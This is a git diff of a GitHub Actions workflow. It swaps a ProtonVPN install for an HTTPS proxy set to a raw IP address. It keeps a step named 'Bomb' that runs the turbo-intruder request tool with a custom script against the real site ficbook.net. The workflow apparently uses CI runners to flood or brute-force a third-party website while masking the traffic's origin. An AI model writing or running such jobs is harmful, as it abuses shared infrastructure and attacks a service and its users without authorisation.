@@ -20,12 +20,8 @@ jobs:
     steps:
     - name: Copy
       uses: actions/checkout@v3
-    - name: install vpn
+    - name: install proxy
       run: |
-        ls -R
-        sudo apt-get install protonvpn-stable-release_1.0.3_all.deb
-        sudo apt-get update
-        sudo apt-get install protonvpn-cli
-        protonvpn-cli netshield --off
+        export HTTPS_PROXY=14.207.80.241:8080
     - name: Bomb
       run: java -jar turbo-intruder-all.jar beta/script_l.py beta/req.txt https://ficbook.net:433 foo
